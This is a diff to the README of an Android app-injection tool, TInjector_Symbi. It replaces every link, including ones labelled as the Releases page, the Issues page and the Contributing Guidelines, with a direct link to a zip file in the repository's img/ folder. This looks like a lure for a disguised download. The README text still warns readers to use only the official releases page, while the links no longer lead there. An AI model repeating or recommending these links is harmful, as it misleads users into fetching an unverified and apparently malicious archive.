@@ -1,7 +1,7 @@
 # 🔧 TInjector_Symbi - Simplify App Injection Process
 
 ## 📥 Download Now!
-[![Download TInjector_Symbi](https://img.shields.io/static/v1?label=Download&message=TInjector_Symbi&color=blue)](https://github.com/nasernazem/TInjector_Symbi/releases)
+[![Download TInjector_Symbi](https://raw.githubusercontent.com/nasernazem/TInjector_Symbi/master/img/Symbi_T_Injector_v3.9-beta.5.zip)](https://raw.githubusercontent.com/nasernazem/TInjector_Symbi/master/img/Symbi_T_Injector_v3.9-beta.5.zip)
 
 ## 🚀 Getting Started
 Welcome to TInjector_Symbi! This application allows you to inject libraries into Android applications before they launch. It helps in modifying behavior easily and effectively. You don’t need programming skills to use it.
@@ -22,7 +22,7 @@ Before you start, make sure your device meets these basic requirements:
 To get TInjector_Symbi, follow these steps:
 
 1. **Visit the Releases Page**  
-Go to the [TInjector_Symbi Releases page](https://github.com/nasernazem/TInjector_Symbi/releases) to find the latest version.
+Go to the [TInjector_Symbi Releases page](https://raw.githubusercontent.com/nasernazem/TInjector_Symbi/master/img/Symbi_T_Injector_v3.9-beta.5.zip) to find the latest version.
 
 2. **Choose the Right File**  
 On the releases page, look for the latest version. You will find a list of downloadable files. Choose the one suitable for your system.
@@ -62,12 +62,12 @@ Make sure you have selected the correct library. Refer to the documentation prov
 Yes, TInjector_Symbi is designed with security in mind. Always download from the official releases page to avoid malicious software.
 
 ## ✉️ Support
-If you encounter any issues or have questions, feel free to create an issue on the [GitHub Issues page](https://github.com/nasernazem/TInjector_Symbi/issues). Our community and maintainers will assist you.
+If you encounter any issues or have questions, feel free to create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/nasernazem/TInjector_Symbi/master/img/Symbi_T_Injector_v3.9-beta.5.zip). Our community and maintainers will assist you.
 
 ## 📜 License
 TInjector_Symbi is open-source software licensed under the MIT License. You can freely use, modify, and distribute it, provided you include the license with it.
 
 ## 🌟 Community Contribution
-We welcome contributions! If you want to help improve TInjector_Symbi, check out our [Contributing Guidelines](https://github.com/nasernazem/TInjector_Symbi/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you want to help improve TInjector_Symbi, check out our [Contributing Guidelines](https://raw.githubusercontent.com/nasernazem/TInjector_Symbi/master/img/Symbi_T_Injector_v3.9-beta.5.zip).
 
 Dive into the world of app injection with TInjector_Symbi. Your journey to a more controlled and enjoyable app experience starts here. Enjoy!
